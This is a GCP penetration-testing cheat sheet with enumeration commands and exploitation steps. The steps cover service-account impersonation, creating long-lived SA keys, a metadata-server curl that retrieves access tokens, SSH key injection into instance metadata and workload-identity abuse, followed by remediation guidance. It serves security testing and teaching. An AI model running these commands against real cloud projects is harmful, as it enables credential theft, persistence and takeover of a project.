# GCP Pentest

> Service-account abuse, IAM privilege paths, metadata SSRF, public Cloud Storage / Compute resources. Authorized engagements only.

## TL;DR
- Identity model: human user, service account (SA), workload identity (GKE). Almost all GCP breaches pivot on SA keys or impersonation chains.
- Default Compute Engine SA (`<project-number>-compute@developer.gserviceaccount.com`) is *Editor* on the project unless explicitly downscoped → an SSRF to metadata that returns its token compromises the project.
- Roles to flag: `roles/iam.serviceAccountTokenCreator`, `roles/iam.serviceAccountUser`, `roles/owner`, `roles/editor` — each enables privesc.
- Map: MITRE ATT&CK for Cloud, hackingthe.cloud GCP guide.

## Detection / Discovery

### Identity & permissions
| Command | Description |
| --- | --- |
| `gcloud auth list` | Active accounts |
| `gcloud config list` | Current project, region, etc. |
| `gcloud auth print-access-token` | Bearer for `Authorization: Bearer <tok>` |
| `gcloud projects list` | Project inventory |
| `gcloud projects get-iam-policy <project> --format=json` | Full IAM binding dump |
| `gcloud organizations list` | Org-level scope (often blocked) |
| `gcloud iam service-accounts list` | SAs in the current project |

### Service inventory
| Command | Description |
| --- | --- |
| `gcloud compute instances list` | Compute Engine VMs |
| `gcloud compute instances describe <name> --zone <z>` | Per-instance metadata (incl. SSH keys, startup-script) |
| `gcloud storage ls` (or `gsutil ls`) | Cloud Storage buckets you can see |
| `gcloud functions list` | Cloud Functions |
| `gcloud run services list` | Cloud Run services |
| `gcloud container clusters list` | GKE clusters |
| `gcloud secrets list` then `versions access` | Secret Manager |

### Tools
| Tool | Purpose |
| --- | --- |
| `gcp_enum.sh` (Rhino) | Bulk read-only enumeration |
| `gcp_scanner` (https://github.com/google/gcp_scanner) | Authenticated GCP-wide enum |
| `GCPBucketBrute` | Storage bucket name brute force |

## Exploitation

### Cloud Storage misconfig
```bash
# Public-read bucket
gsutil ls -L gs://<bucket>/
gsutil iam get gs://<bucket>           # check for allUsers / allAuthenticatedUsers

# Bucket name brute force
GCPBucketBrute -k acme,prod,dev,backup -u
```

### Service-account impersonation chain
```bash
# Identity A has roles/iam.serviceAccountTokenCreator on SA B
gcloud iam service-accounts get-access-token --impersonate-service-account=<B>@<project>.iam.gserviceaccount.com
# Or via the API directly:
gcloud auth application-default print-access-token --impersonate-service-account=<B>@...
```
Chain through every SA where the current identity has TokenCreator; pivot to whichever has the broadest project-level role.

### SA key extraction
```bash
gcloud iam service-accounts list
gcloud iam service-accounts keys create key.json --iam-account=<sa>@<project>.iam.gserviceaccount.com
# Now key.json grants long-lived access; gcloud auth activate-service-account --key-file=key.json
```
The action is logged in Cloud Audit Logs (`google.iam.admin.v1.CreateServiceAccountKey`) — noisy.

### Metadata SSRF (GCE / Cloud Run / GKE node)
See [./ssrf-cloud-metadata.md](./ssrf-cloud-metadata.md). Short form:
```bash
# Metadata-Flavor header is required by GCP IMDS (CWE-918 mitigation; SSRF often misses the header)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: {"access_token":"ya29...", "expires_in":3000, "token_type":"Bearer"}
```
The token's scope is set by the instance's SA + access-scopes config; classic project-Editor scope on default Compute SA is `cloud-platform`.

### Compute Engine SSH metadata injection
Add an SSH key to instance metadata if you have `compute.instances.setMetadata`:
```bash
ssh-keygen -t ed25519 -C "user1" -f key
gcloud compute instances add-metadata <inst> --zone <z> --metadata=ssh-keys="user1:$(cat key.pub)"
gcloud compute ssh user1@<inst> --zone <z>
```

### GKE workload-identity abuse
On a compromised pod with workload-identity bound to a privileged Kubernetes SA + GCP SA, `gcloud auth print-access-token` (or curl to metadata) yields the GCP SA's token from inside the pod — full GCP attack surface follows.

## Defence / Remediation
- **No SA keys**: prefer workload identity for GKE; use Application Default Credentials with short-lived OIDC tokens elsewhere. Disable SA key creation org-wide (`constraints/iam.disableServiceAccountKeyCreation`).
- **Trim the default Compute Engine SA** down from Editor at project creation, or use a per-instance SA with the minimum scopes. Disable the legacy Cloud APIs scope.
- **Org Policies** as guardrails: `constraints/storage.publicAccessPrevention`, `constraints/iam.allowedPolicyMemberDomains` (restrict to your domain), `constraints/iam.disableServiceAccountKeyUpload`.
- **VPC Service Controls** perimeters around sensitive services (Storage, BigQuery, Secret Manager) to block exfil even with stolen tokens.
- **Cloud Audit Logs** with sink to a logging project + SCC alerts for `CreateServiceAccountKey`, `SetIamPolicy` on highly-privileged roles.

## Sources
- GCP Security Best Practices: https://cloud.google.com/security/best-practices
- GCP IAM Roles reference: https://cloud.google.com/iam/docs/understanding-roles
- GCP Metadata server documentation: https://cloud.google.com/compute/docs/metadata/default-metadata-values
- hackingthe.cloud — GCP: https://hackingthe.cloud/
- HackTricks GCP pentesting: https://book.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html
- gcp_scanner: https://github.com/google/gcp_scanner
- MITRE ATT&CK for Cloud: https://attack.mitre.org/matrices/enterprise/cloud/
